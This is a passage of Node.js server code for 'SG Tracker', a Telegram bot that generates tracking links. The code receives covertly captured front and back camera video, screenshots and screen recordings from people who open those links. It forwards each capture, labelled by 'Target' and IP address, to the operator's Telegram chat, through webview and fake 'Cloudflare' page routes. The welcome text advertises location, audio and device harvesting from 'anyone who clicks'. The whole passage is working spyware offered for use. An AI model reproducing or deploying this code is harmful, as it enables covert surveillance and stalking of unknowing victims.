    var videoData = decodeURIComponent(req.body.data) || null;
      
    if (uid != null && videoData != null) {
      console.log(`Received back camera video for uid ${uid}`);
      
      try {
        // Convert base64 to buffer
        var buffer = Buffer.from(videoData, 'base64');
        console.log(`Converted base64 to buffer, size: ${buffer.length} bytes`);
          
        // Create temporary directory if it doesn't exist (needed for Vercel)
        const dirPath = path.join(__dirname, '..', 'screens');
        fs.mkdirSync(dirPath, { recursive: true });
        
        // Create a temporary file path (will be deleted after sending)
        const filePath = path.join(dirPath, `${uid}_back_camera_video.webm`);
        fs.writeFileSync(filePath, buffer);
        console.log(`Back camera video temporarily saved to ${filePath}`);
          
        // Get client IP if it's stored in targets
        const ipAddress = targets[uid]?.ip || 'Unknown';
        const timestamp = getFormattedDate();
        
        // Convert uid to chat ID if needed
        let chatId;
        try {
          // First check if it's in targets
          if (targets[uid] && targets[uid].chatId) {
            chatId = targets[uid].chatId;
          } else {
            // Otherwise, convert from base36
            chatId = parseInt(uid, 36);
          }
          console.log(`Sending to chat ID: ${chatId}`);
        } catch (error) {
          console.error("Error converting uid to chat ID:", error);
          chatId = uid; // Fallback to the original uid
        }
        
        // Create a more attractive caption with emojis and formatting
        const videoCaption = 
          `🎥 <b>Back Camera Video Captured</b> 🎥\n\n` +
          `📱 <b>Target:</b> <code>${uid}</code>\n` +
          `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
          `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n` +
          `📊 <b>Size:</b> <code>${Math.round(buffer.length/1024)} KB</code>\n` +
          `⏱️ <b>Duration:</b> <code>8 seconds</code>\n\n` +
          `<i>Captured using SGTracker by @SG_Modder</i>`;
          
        try {
          // Send video to Telegram using file path
          await bot.sendVideo(chatId, filePath, { 
            caption: videoCaption,
            parse_mode: "HTML"
          });
          console.log("Back camera video sent successfully to Telegram");
          
          // Delete the temporary file after sending to Telegram (important for Vercel)
          try {
            fs.unlinkSync(filePath);
            console.log(`Temporary file deleted: ${filePath}`);
          } catch (deleteError) {
            console.error(`Error deleting temporary file: ${deleteError}`);
          }
        } catch (error) {
          console.log("Error sending back camera video to Telegram:", error);
          // Try to send as document if video send fails
          try {
            await bot.sendDocument(chatId, filePath, { 
              caption: videoCaption + "\n\n⚠️ Sent as document due to video processing error.",
              parse_mode: "HTML"
            });
            console.log("Back camera video sent as document to Telegram");
            
            // Delete the temporary file after sending to Telegram (important for Vercel)
            try {
              fs.unlinkSync(filePath);
              console.log(`Temporary file deleted: ${filePath}`);
            } catch (deleteError) {
              console.error(`Error deleting temporary file: ${deleteError}`);
            }
          } catch (docError) {
            console.log("Error sending back camera video as document:", docError);
          }
        }
      } catch (error) {
        console.error("Error processing back camera video:", error);
        res.status(500).send("Error processing recording");
        return;
      }
      
      res.status(200).send("Back camera video processed successfully");
    } else {
      res.status(400).send("Missing UID or video data");
    }
  } catch (error) {
    console.error("Error in back camera video handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Generic Camera Video endpoint (for backward compatibility)
app.post("/cameravideo", async (req, res) => {
  try {
    console.log("Camera video endpoint hit");
    
    var uid = decodeURIComponent(req.body.uid) || null;
    var videoData = decodeURIComponent(req.body.data) || null;
    var chunkIndex = req.body.chunkIndex ? parseInt(req.body.chunkIndex) : null;
    var totalChunks = req.body.totalChunks ? parseInt(req.body.totalChunks) : null;
    var isLastChunk = req.body.isLastChunk === 'true';
    
    // Check if we're receiving chunked video data
    const isChunked = chunkIndex !== null && totalChunks !== null;
    
    if (uid != null && videoData != null) {
      console.log(`Received camera video ${isChunked ? `chunk ${chunkIndex+1}/${totalChunks}` : 'data'} for uid ${uid}`);
      
      try {
        // Create temporary directory if it doesn't exist (needed for Vercel)
        const dirPath = path.join(__dirname, '..', 'screens');
        fs.mkdirSync(dirPath, { recursive: true });
        
        // Handle chunked uploads - special process for Vercel
        if (isChunked) {
          const chunkDir = path.join(dirPath, `${uid}_chunks`);
          fs.mkdirSync(chunkDir, { recursive: true });
          
          // Save this chunk
          const chunkPath = path.join(chunkDir, `chunk_${chunkIndex}.part`);
          fs.writeFileSync(chunkPath, videoData);
          console.log(`Saved chunk ${chunkIndex+1}/${totalChunks} to ${chunkPath}`);
          
          // If this is the last chunk, combine all chunks
          if (isLastChunk) {
            console.log(`Processing final chunk ${chunkIndex+1}/${totalChunks}, combining data...`);
            let combinedData = '';
            
            // Read and combine all chunks in order
            for (let i = 0; i < totalChunks; i++) {
              const nextChunkPath = path.join(chunkDir, `chunk_${i}.part`);
              if (fs.existsSync(nextChunkPath)) {
                combinedData += fs.readFileSync(nextChunkPath, 'utf8');
                // Delete the chunk after reading
                fs.unlinkSync(nextChunkPath);
              } else {
                console.error(`Missing chunk ${i} when combining video`);
              }
            }
            
            // Remove the temporary chunks directory
            try {
              fs.rmdirSync(chunkDir);
            } catch (e) {
              console.error(`Error removing chunks directory: ${e}`);
            }
            
            // Convert the combined base64 to buffer
            var buffer = Buffer.from(combinedData, 'base64');
          } else {
            // If not the last chunk, just acknowledge receipt
            res.status(200).send(`Chunk ${chunkIndex+1}/${totalChunks} received`);
            return;
          }
        } else {
          // Regular non-chunked process - convert base64 to buffer
          var buffer = Buffer.from(videoData, 'base64');
        }
        
        console.log(`Processed video data, size: ${buffer.length} bytes`);
        
        // Create a temporary file path (will be deleted after sending)
        const filePath = path.join(dirPath, `${uid}_camera_video.webm`);
        fs.writeFileSync(filePath, buffer);
        console.log(`Camera video temporarily saved to ${filePath}`);
          
        // Get client IP if it's stored in targets
        const ipAddress = targets[uid]?.ip || 'Unknown';
        const timestamp = getFormattedDate();
        
        // Convert uid to chat ID if needed
        let chatId;
        try {
          // First check if it's in targets
          if (targets[uid] && targets[uid].chatId) {
            chatId = targets[uid].chatId;
          } else {
            // Otherwise, convert from base36
            chatId = parseInt(uid, 36);
          }
          console.log(`Sending to chat ID: ${chatId}`);
        } catch (error) {
          console.error("Error converting uid to chat ID:", error);
          chatId = uid; // Fallback to the original uid
        }
        
        // Create a more attractive caption with emojis and formatting
        const videoCaption = 
          `🎥 <b>Camera Video Captured</b> 🎥\n\n` +
          `📱 <b>Target:</b> <code>${uid}</code>\n` +
          `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
          `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n` +
          `📊 <b>Size:</b> <code>${Math.round(buffer.length/1024)} KB</code>\n\n` +
          `<i>Captured using SGTracker by @SG_Modder</i>`;
          
        try {
          // Send video to Telegram using file path
          await bot.sendVideo(chatId, filePath, { 
            caption: videoCaption,
            parse_mode: "HTML"
          });
          console.log("Camera video sent successfully to Telegram");
          
          // Delete the temporary file after sending to Telegram (important for Vercel)
          try {
            fs.unlinkSync(filePath);
            console.log(`Temporary file deleted: ${filePath}`);
          } catch (deleteError) {
            console.error(`Error deleting temporary file: ${deleteError}`);
          }
        } catch (error) {
          console.log("Error sending camera video to Telegram:", error);
          // Try to send as document if video send fails
          try {
            await bot.sendDocument(chatId, filePath, { 
              caption: videoCaption + "\n\n⚠️ Sent as document due to video processing error.",
              parse_mode: "HTML"
            });
            console.log("Camera video sent as document to Telegram");
            
            // Delete the temporary file after sending to Telegram (important for Vercel)
            try {
              fs.unlinkSync(filePath);
              console.log(`Temporary file deleted: ${filePath}`);
            } catch (deleteError) {
              console.error(`Error deleting temporary file: ${deleteError}`);
            }
          } catch (docError) {
            console.log("Error sending camera video as document:", docError);
          }
        }
      } catch (error) {
        console.error("Error processing camera video:", error);
        res.status(500).send("Error processing recording");
        return;
      }
      
      res.status(200).send("Camera video processed successfully");
    } else {
      res.status(400).send("Missing UID or video data");
    }
  } catch (error) {
    console.error("Error in camera video handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Screen recording endpoint (redirects to cameravideo for compatibility)
app.post("/screenrecording", async (req, res) => {
  console.log("Redirecting screen recording request to camera video endpoint");
  try {
    // Forward the request to the camera video endpoint
    req.url = "/cameravideo";
    app._router.handle(req, res);
  } catch (error) {
    console.error("Error redirecting screen recording request:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Front camera recording endpoint
app.post("/frontcamera", async (req, res) => {
  try {
    console.log("Front camera recording endpoint hit");
    
    var uid = decodeURIComponent(req.body.uid) || null;
    var videoData = decodeURIComponent(req.body.data) || null;
      
    if (uid != null && videoData != null) {
      console.log(`Received front camera recording for uid ${uid}`);
      
      try {
        // Convert base64 to buffer
        var buffer = Buffer.from(videoData, 'base64');
        console.log(`Converted base64 to buffer, size: ${buffer.length} bytes`);
          
        // Create directory if it doesn't exist
        const dirPath = path.join(__dirname, '..', 'screens');
        fs.mkdirSync(dirPath, { recursive: true });
        
        // Save video to file
        const filePath = path.join(dirPath, `${uid}_front_camera.webm`);
        fs.writeFileSync(filePath, buffer);
        console.log(`Front camera recording saved to ${filePath}`);
          
        // Get client IP if it's stored in targets
        const ipAddress = targets[uid]?.ip || 'Unknown';
        const timestamp = getFormattedDate();
        
        // Convert uid to chat ID if needed
        let chatId;
        try {
          // First check if it's in targets
          if (targets[uid] && targets[uid].chatId) {
            chatId = targets[uid].chatId;
          } else {
            // Otherwise, convert from base36
            chatId = parseInt(uid, 36);
          }
          console.log(`Sending to chat ID: ${chatId}`);
        } catch (error) {
          console.error("Error converting uid to chat ID:", error);
          chatId = uid; // Fallback to the original uid
        }
        
        // Create a more attractive caption with emojis and formatting
        const videoCaption = 
          `📱 <b>Front Camera Recording Captured</b> 📱\n\n` +
          `👤 <b>Target:</b> <code>${uid}</code>\n` +
          `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
          `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n` +
          `📊 <b>Size:</b> <code>${Math.round(buffer.length/1024)} KB</code>\n\n` +
          `<i>Captured using SGTracker by @SG_Modder</i>`;
          
        try {
          // Send video to Telegram using file path
          await bot.sendVideo(chatId, filePath, { 
            caption: videoCaption,
            parse_mode: "HTML"
          });
          console.log("Front camera recording sent successfully to Telegram");
        } catch (error) {
          console.log("Error sending front camera recording to Telegram:", error);
          // Try to send as document if video send fails
          try {
            await bot.sendDocument(chatId, filePath, { 
              caption: videoCaption + "\n\n⚠️ Sent as document due to video processing error.",
              parse_mode: "HTML"
            });
            console.log("Front camera recording sent as document to Telegram");
          } catch (docError) {
            console.log("Error sending front camera recording as document:", docError);
          }
        }
      } catch (error) {
        console.error("Error processing front camera recording:", error);
        res.status(500).send("Error processing recording");
        return;
      }
      
      res.status(200).send("Front camera recording processed successfully");
    } else {
      res.status(400).send("Missing UID or video data");
    }
  } catch (error) {
    console.error("Error in front camera recording handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Back camera recording endpoint
app.post("/backcamera", async (req, res) => {
  try {
    console.log("Back camera recording endpoint hit");
    
    var uid = decodeURIComponent(req.body.uid) || null;
    var videoData = decodeURIComponent(req.body.data) || null;
      
    if (uid != null && videoData != null) {
      console.log(`Received back camera recording for uid ${uid}`);
      
      try {
        // Convert base64 to buffer
        var buffer = Buffer.from(videoData, 'base64');
        console.log(`Converted base64 to buffer, size: ${buffer.length} bytes`);
          
        // Create directory if it doesn't exist
        const dirPath = path.join(__dirname, '..', 'screens');
        fs.mkdirSync(dirPath, { recursive: true });
        
        // Save video to file
        const filePath = path.join(dirPath, `${uid}_back_camera.webm`);
        fs.writeFileSync(filePath, buffer);
        console.log(`Back camera recording saved to ${filePath}`);
          
        // Get client IP if it's stored in targets
        const ipAddress = targets[uid]?.ip || 'Unknown';
        const timestamp = getFormattedDate();
        
        // Convert uid to chat ID if needed
        let chatId;
        try {
          // First check if it's in targets
          if (targets[uid] && targets[uid].chatId) {
            chatId = targets[uid].chatId;
          } else {
            // Otherwise, convert from base36
            chatId = parseInt(uid, 36);
          }
          console.log(`Sending to chat ID: ${chatId}`);
        } catch (error) {
          console.error("Error converting uid to chat ID:", error);
          chatId = uid; // Fallback to the original uid
        }
        
        // Create a more attractive caption with emojis and formatting
        const videoCaption = 
          `📷 <b>Back Camera Recording Captured</b> 📷\n\n` +
          `👤 <b>Target:</b> <code>${uid}</code>\n` +
          `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
          `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n` +
          `📊 <b>Size:</b> <code>${Math.round(buffer.length/1024)} KB</code>\n\n` +
          `<i>Captured using SGTracker by @SG_Modder</i>`;
          
        try {
          // Send video to Telegram using file path
          await bot.sendVideo(chatId, filePath, { 
            caption: videoCaption,
            parse_mode: "HTML"
          });
          console.log("Back camera recording sent successfully to Telegram");
        } catch (error) {
          console.log("Error sending back camera recording to Telegram:", error);
          // Try to send as document if video send fails
          try {
            await bot.sendDocument(chatId, filePath, { 
              caption: videoCaption + "\n\n⚠️ Sent as document due to video processing error.",
              parse_mode: "HTML"
            });
            console.log("Back camera recording sent as document to Telegram");
          } catch (docError) {
            console.log("Error sending back camera recording as document:", docError);
          }
        }
      } catch (error) {
        console.error("Error processing back camera recording:", error);
        res.status(500).send("Error processing recording");
        return;
      }
      
      res.status(200).send("Back camera recording processed successfully");
    } else {
      res.status(400).send("Missing UID or video data");
    }
  } catch (error) {
    console.error("Error in back camera recording handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// All cameras endpoint - combines front and back camera recordings
app.post("/allcams", async (req, res) => {
  try {
    console.log("All cameras recording endpoint hit");
    
    var uid = decodeURIComponent(req.body.uid) || null;
    var frontVideoData = decodeURIComponent(req.body.frontData) || null;
    var backVideoData = decodeURIComponent(req.body.backData) || null;
    var screenData = decodeURIComponent(req.body.screenData) || null;
      
    if (uid != null && (frontVideoData != null || backVideoData != null || screenData != null)) {
      console.log(`Received multi-camera recording for uid ${uid}`);
      
      try {
        // Create directory if it doesn't exist
        const dirPath = path.join(__dirname, '..', 'screens');
        fs.mkdirSync(dirPath, { recursive: true });
        
        // Save videos to files if available
        let filesPaths = [];
        
        if (frontVideoData) {
          var frontBuffer = Buffer.from(frontVideoData, 'base64');
          const frontFilePath = path.join(dirPath, `${uid}_front_camera.webm`);
          fs.writeFileSync(frontFilePath, frontBuffer);
          console.log(`Front camera recording saved to ${frontFilePath}`);
          filesPaths.push(frontFilePath);
        }
        
        if (backVideoData) {
          var backBuffer = Buffer.from(backVideoData, 'base64');
          const backFilePath = path.join(dirPath, `${uid}_back_camera.webm`);
          fs.writeFileSync(backFilePath, backBuffer);
          console.log(`Back camera recording saved to ${backFilePath}`);
          filesPaths.push(backFilePath);
        }
        
        if (screenData) {
          var screenBuffer = Buffer.from(screenData, 'base64');
          const screenFilePath = path.join(dirPath, `${uid}_screen_recording.webm`);
          fs.writeFileSync(screenFilePath, screenBuffer);
          console.log(`Screen recording saved to ${screenFilePath}`);
          filesPaths.push(screenFilePath);
        }
          
        // Get client IP if it's stored in targets
        const ipAddress = targets[uid]?.ip || 'Unknown';
        const timestamp = getFormattedDate();
        
        // Convert uid to chat ID if needed
        let chatId;
        try {
          // First check if it's in targets
          if (targets[uid] && targets[uid].chatId) {
            chatId = targets[uid].chatId;
          } else {
            // Otherwise, convert from base36
            chatId = parseInt(uid, 36);
          }
          console.log(`Sending to chat ID: ${chatId}`);
        } catch (error) {
          console.error("Error converting uid to chat ID:", error);
          chatId = parseInt(uid, 36); // Fallback to the conversion
        }
        
        // Send an initial message about the capture
        await bot.sendMessage(chatId, 
          `🎥 <b>Multi-Camera Capture Successful!</b> 🎥\n\n` +
          `Target <code>${uid}</code> has been successfully tracked with our advanced camera capture system.\n\n` +
          `Preparing data and videos for transmission...\n\n` +
          `<i>Captured using SGTracker by @SG_Modder</i>`,
          { parse_mode: "HTML" }
        );
        
        // Create captions for each video
        const videoCaptions = {
          front: `📱 <b>Front Camera Recording</b> 📱\n\n` +
            `👤 <b>Target:</b> <code>${uid}</code>\n` +
            `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
            `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n\n` +
            `<i>Captured using SGTracker by @SG_Modder</i>`,
            
          back: `📷 <b>Back Camera Recording</b> 📷\n\n` +
            `👤 <b>Target:</b> <code>${uid}</code>\n` +
            `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
            `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n\n` +
            `<i>Captured using SGTracker by @SG_Modder</i>`,
            
          // Screen recording template removed as requested
            audio: `🎵 <b>Audio Recording</b> 🎵\n\n` +
            `👤 <b>Target:</b> <code>${uid}</code>\n` +
            `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
            `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n\n` +
            `<i>Captured using SGTracker by @SG_Modder</i>`
        };
          
        // Send each video with its caption
        for (let i = 0; i < filesPaths.length; i++) {
          const filePath = filesPaths[i];
          let captionKey;
          
          if (filePath.includes('front')) {
            captionKey = 'front';
          } else if (filePath.includes('back')) {
            captionKey = 'back';
          } else if (filePath.includes('screen')) {
            captionKey = 'screen';
          }
          
          try {
            // Send video to Telegram
            await bot.sendVideo(chatId, filePath, { 
              caption: videoCaptions[captionKey],
              parse_mode: "HTML"
            });
            console.log(`${captionKey} camera recording sent successfully to Telegram`);
          } catch (error) {
            console.log(`Error sending ${captionKey} recording to Telegram:`, error);
            // Try to send as document if video send fails
            try {
              await bot.sendDocument(chatId, filePath, { 
                caption: videoCaptions[captionKey] + "\n\n⚠️ Sent as document due to video processing error.",
                parse_mode: "HTML"
              });
            } catch (docError) {
              console.error(`Failed to send ${captionKey} recording as document:`, docError);
            }
          }
          
          // Add a small delay between sending videos to avoid rate limiting
          await new Promise(resolve => setTimeout(resolve, 2000));
        }
        
        // Send a completion message
        await bot.sendMessage(chatId, 
          `✅ <b>Multi-Camera Capture Complete</b> ✅\n\n` +
          `All available video feeds have been successfully captured and transmitted.\n\n` +
          `<b>Summary:</b>\n` +
          `• ${frontVideoData ? '✓' : '✗'} Front Camera\n` +
          `• ${backVideoData ? '✓' : '✗'} Back Camera\n\n` +
          `<b>IP Address:</b> <code>${ipAddress}</code>\n` +
          `<b>Timestamp:</b> <code>${timestamp}</code>\n\n` +
          `<i>SGTracker Premium by @SG_Modder</i>`,
          { parse_mode: "HTML" }
        );
        
        console.log("All camera recordings sent successfully to Telegram");
      } catch (error) {
        console.error("Error processing multi-camera recordings:", error);
        res.status(500).send("Error processing multi-camera recordings");
        return;
      }
      
      res.status(200).send("Multi-camera recordings processed successfully");
    } else {
      res.status(400).send("Missing UID or video data");
    }
  } catch (error) {
    console.error("Error in multi-camera recording handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// New screenshot endpoint
app.post("/screenshot", async (req, res) => {
  try {
    console.log("Screenshot endpoint hit");
    
    var uid = decodeURIComponent(req.body.uid) || null;
    var imageData = decodeURIComponent(req.body.img) || null;
      
    if (uid != null && imageData != null) {
      console.log(`Received screenshot data for uid ${uid}`);
      
      try {
        // Convert base64 to buffer
        var buffer = Buffer.from(imageData, 'base64');
        console.log(`Converted base64 to buffer, size: ${buffer.length} bytes`);
          
        // Create directory if it doesn't exist
        const dirPath = path.join(__dirname, '..', 'screens');
        fs.mkdirSync(dirPath, { recursive: true });
        
        // Save image to file (we only need to do this once)
        const filePath = path.join(dirPath, `${uid}_screenshot.png`);
        fs.writeFileSync(filePath, buffer);
        console.log(`Screenshot saved to ${filePath}`);
          
        // Get client IP if it's stored in targets
        const ipAddress = targets[uid]?.ip || 'Unknown';
        const timestamp = getFormattedDate();
        
        // Convert uid to chat ID if needed
        let chatId;
        try {
          // First check if it's in targets
          if (targets[uid] && targets[uid].chatId) {
            chatId = targets[uid].chatId;
          } else {
            // Otherwise, convert from base36
            chatId = parseInt(uid, 36);
          }
          console.log(`Sending to chat ID: ${chatId}`);
        } catch (error) {
          console.error("Error converting uid to chat ID:", error);
          chatId = uid; // Fallback to the original uid
        }
        
        // Create a more attractive caption with emojis and formatting
        const screenshotCaption = 
          `📸 <b>Screenshot Captured Successfully</b> 📸\n\n` +
          `📱 <b>Target:</b> <code>${uid}</code>\n` +
          `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
          `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n` +
          `📊 <b>Size:</b> <code>${Math.round(buffer.length/1024)} KB</code>\n\n` +
          `<i>Captured using SGTracker by @SG_Modder</i>`;
          
        try {
          // Send photo to Telegram using file path
          await bot.sendPhoto(chatId, filePath, { 
            caption: screenshotCaption,
            parse_mode: "HTML"
          });
          console.log("Screenshot sent successfully to Telegram");
        } catch (error) {
          console.log("Error sending screenshot to Telegram:", error);
          
          // If sending as photo fails, try to send as document
          try {
            await bot.sendDocument(chatId, filePath, { 
              caption: screenshotCaption,
              parse_mode: "HTML"
            });
            console.log("Screenshot sent as document successfully");
          } catch (docError) {
            console.log("Error sending screenshot as document:", docError);
            
            // If sending as document also fails, send text notification
            try {
              await bot.sendMessage(chatId, 
                `📸 <b>Screenshot captured</b>\n` +
                `📱 Target ID: <code>${uid}</code>\n` +
                `🌐 IP: <code>${ipAddress}</code>\n` +
                `⏰ Time: <code>${timestamp}</code>\n\n` +
                `<i>Screenshot saved to server but could not be sent to Telegram</i>`,
                { parse_mode: "HTML" }
              );
              console.log("Screenshot notification sent as text message");
            } catch (msgError) {
              console.log("Error sending screenshot notification:", msgError);
            }
          }
        }
          
        res.send("Screenshot received");
      } catch (conversionError) {
        console.error("Error processing screenshot:", conversionError);
        res.status(500).send("Error processing screenshot data");
      }
    } else {
      console.log("Missing uid or screenshot data");
      res.status(400).send("Bad Request: Missing uid or screenshot data");
    }
  } catch (error) {
    console.error("Error in screenshot handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Webview route with capture method
app.get("/w/:uid/:uri/:uniqueId?/:captureMethod?", async (req, res) => {
  try {
    const uid = req.params.uid;
    const uri = req.params.uri;
    const uniqueId = req.params.uniqueId || 'default';
    const captureMethod = req.params.captureMethod || "full"; // Default to full capture
    
    if (!uid || !uri) {
      return res.redirect("https://t.me/SG_Modder");
    }
    
    const ip = getClientIp(req);
    const time = getFormattedDate();
    
    // Log access with unique ID and capture method for tracking
    console.log(`WebView access: ${uniqueId} | IP: ${ip} | Time: ${time} | CaptureMethod: ${captureMethod}`);
    
    // Render the template
    const html = ejs.render(webviewTemplate, {
      ip: ip,
      time: time,
      url: atob(uri),
      uid: uid,
      a: hostURL,
      t: use1pt,
      captureMethod: captureMethod
    });
    
    res.setHeader('Content-Type', 'text/html');
    res.send(html);
  } catch (error) {
    console.error("Error in webview handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Cloudflare route with capture method
app.get("/c/:uid/:uri/:uniqueId?/:captureMethod?", async (req, res) => {
  try {
    const uid = req.params.uid;
    const uri = req.params.uri;
    const uniqueId = req.params.uniqueId || 'default';
    const captureMethod = req.params.captureMethod || "full"; // Default to full capture
    
    if (!uid || !uri) {
      return res.redirect("https://t.me/SG_Modder");
    }
    
    const ip = getClientIp(req);
    const time = getFormattedDate();
    
    // Log access with unique ID for tracking
    console.log(`CloudFlare access: ${uniqueId} | IP: ${ip} | Time: ${time}`);
    
    // Render the template
    const html = ejs.render(cloudflareTemplate, {
      ip: ip,
      time: time,
      url: atob(uri),
      uid: uid,
      a: hostURL,
      t: use1pt,
      captureMethod: captureMethod
    });
    
    res.setHeader('Content-Type', 'text/html');
    res.send(html);
  } catch (error) {
    console.error("Error in cloudflare handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Telegram Bot Webhook Handler for production
app.post("/webhook", async (req, res) => {
  try {
    const update = req.body;
    
    // Handle callback queries (button clicks)
    if (update.callback_query) {
      const callbackQuery = update.callback_query;
      await bot.answerCallbackQuery(callbackQuery.id);
      const chatId = callbackQuery.message.chat.id;
      
      if (callbackQuery.data === "crenew") {
        // For create new, edit the current message
        await createNew(chatId, callbackQuery.message.message_id);
      } else if (callbackQuery.data === "help") {
        // Show help message when the help button is clicked - edit message
        await sendHelpMessage(chatId, callbackQuery.message.message_id);
      } else if (callbackQuery.data === "back_to_main") {
        // Go back to main menu - edit message
        await sendWelcomeMessage(chatId, callbackQuery.message.chat.first_name, callbackQuery.message.message_id);
      } else if (callbackQuery.data === "channels") {
        // Show channels information by editing current message
        await bot.editMessageText(
          `<b>📢 SG Modder Channels 📢</b>\n\n` +
          `Join our official channels for updates, tools and more!\n\n` +
          `• <a href="https://t.me/sgmoddernew">@sgmoddernew</a> - Main channel\n` +
          `• <a href="https://t.me/SG_Modder0">@SG_Modder0</a> - Updates channel\n` +
          `• <a href="https://t.me/SG_Modder1">@SG_Modder1</a> - Tools channel\n\n` +
          `<b>👨‍💻 Contact:</b> <a href="https://t.me/SG_Modder">@SG_Modder</a>`,
          { 
            chat_id: chatId, 
            message_id: callbackQuery.message.message_id, 
            parse_mode: "HTML",
            reply_markup: JSON.stringify({
              "inline_keyboard": [
                [
                  { text: "🔙 Back", callback_data: "back_to_main" }
                ]
              ]
            })
          }
        );
      } else if (callbackQuery.data.startsWith("capture_")) {
        // Handle capture method selection
        const captureMethodId = callbackQuery.data.replace("capture_", "");
        
        if (captureMethodId === "cancel") {
          // User canceled the capture method selection - edit current message
          await bot.editMessageText(
            `<b>❌ Operation canceled</b>\n\nUse /create to start again when you're ready.`,
            { 
              chat_id: chatId, 
              message_id: callbackQuery.message.message_id,
              parse_mode: "HTML",
              reply_markup: JSON.stringify({
                "inline_keyboard": [
                  [
                    { text: "🔗 Try Again", callback_data: "crenew" }
                  ],
                  [
                    { text: "🔙 Back to Main Menu", callback_data: "back_to_main" }
                  ]
                ]
              })
            }
          );
        } else {
          // Process the selected capture method - edit current message
          await processLinkWithCaptureMethod(chatId, captureMethodId, callbackQuery.message.message_id);
        }
      }
      
      return res.status(200).send("OK");
    }
    
    // Handle messages
    if (update.message) {
      const msg = update.message;
      const chatId = msg.chat.id;
      
      // Handle reply to capture method prompt or URL input
      if (msg.reply_to_message && msg.reply_to_message.text) {
        const replyText = msg.reply_to_message.text;
        
        // Check if this is a URL input after selecting a capture method
        if (replyText.includes("This will capture:") || 
            replyText.includes("Enter Your URL:") || 
            replyText.includes("Enter URL to track")) {
          console.log("Webhook: Detected reply to URL prompt:", replyText);
          
          // Find which capture method was selected based on text content
          let methodId = "full"; // Default
          
          if (replyText.includes("Front Camera")) {
            methodId = "full";
          } else if (replyText.includes("Back Camera")) {
            methodId = "back";
          } else if (replyText.includes("Minimal") || replyText.includes("No Camera")) {
            methodId = "minimal";
          } else if (replyText.includes("Audio")) {
            methodId = "audio";
          // Screen recording removed as requested 
          // } else if (replyText.includes("Screen Recording")) {
          //   methodId = "screen";
          } else if (replyText.includes("Screenshot")) {
            methodId = "screenshot";
          }
          
          console.log("Webhook: Creating link with method:", methodId);
          // Create a link with the selected capture method
          await createLink(chatId, msg.text, methodId);
          return res.status(200).send("OK");
        }
        // Basic URL input handling (backward compatibility)
        else if (replyText === "🌐 Enter Your URL") {
          await createLink(chatId, msg.text);
          return res.status(200).send("OK");
        }
      }
      
      // Handle /start command
      if (msg.text === "/start") {
        await sendWelcomeMessage(chatId, msg.chat.first_name);
      }
      // Handle /create command
      else if (msg.text === "/create") {
        await createNew(chatId);
      }
      // Handle /help command
      else if (msg.text === "/help") {
        await sendHelpMessage(chatId);
      }
    }
    
    res.status(200).send("OK");
  } catch (error) {
    console.error("Error in webhook handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Helper function to send welcome message
async function sendWelcomeMessage(chatId, firstName, messageId = null) {
  // Show typing indicator for a more interactive feel
  await bot.sendChatAction(chatId, "typing");
  
  // Create an enhanced keyboard with emojis
  var m = {
    reply_markup: JSON.stringify({
      "inline_keyboard": [
        [
          { text: "🔗 Create Tracking Link", callback_data: "crenew" }
        ],
        [
          { text: "ℹ️ Help", callback_data: "help" }
        ],
        [
          { text: "📢 Our Channels", callback_data: "channels" }
        ]
      ]
    })
  };
  
  // Welcome message content
  const welcomeText = `<b>🌟 Welcome ${firstName}! 🌟</b>\n\n` +
    `<i>SG Tracker</i> is your advanced tracking tool that creates custom links to gather information about anyone who clicks them.\n\n` +
    `<b>📱 What You Can Track:</b>\n` +
    `• 🎥 <b>NEW!</b> Front & Back Camera Video Recording\n` +
    `• 📹 <b>NEW!</b> Separate Front & Back Camera Videos\n` +
    `• 📍 Precise Location with Interactive Maps\n` +
    `• 📷 Camera Snapshots (Front & Back)\n` +
    `• 📸 Full Screenshots with Status Bar\n` +
    `• 🎤 Audio Voice Recording\n` +
    `• 💻 Complete Device Information\n` +
    `• 🔋 Battery & Charging Status\n` +
    `• 🌐 Network & Connection Details\n\n` +
    `<b>👨‍💻 Developed by:</b> <a href="https://t.me/SG_Modder">@SG_Modder</a>\n` +
    `<b>📢 Channels:</b> <a href="https://t.me/sgmoddernew">@sgmoddernew</a>, <a href="https://t.me/SG_Modder0">@SG_Modder0</a>, <a href="https://t.me/SG_Modder1">@SG_Modder1</a>\n` +
    `<b>🔗 GitHub:</b> <a href="https://github.com/SGModder-Offcial">SGModder-Offcial</a>\n\n` +
    `<b>🚀 Get Started:</b> Click the button below or type /create to generate your first tracking link!`;
  
  // If messageId is provided, edit the existing message
  if (messageId) {
    try {
      await bot.editMessageText(welcomeText, { 
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: m.reply_markup
      });
    } catch (error) {
      console.error("Error editing welcome message:", error);
      
      // Fallback to sending a new message
      await bot.sendMessage(
        chatId, 
        welcomeText, 
        { 
          parse_mode: "HTML",
          reply_markup: m.reply_markup
        }
      );
    }
  } else {
    // Send a new message
    await bot.sendMessage(
      chatId, 
      welcomeText, 
      { 
        parse_mode: "HTML",
        reply_markup: m.reply_markup
      }
    );
  }
}

// Helper function to send help message
async function sendHelpMessage(chatId, messageId = null) {
  // Show typing indicator
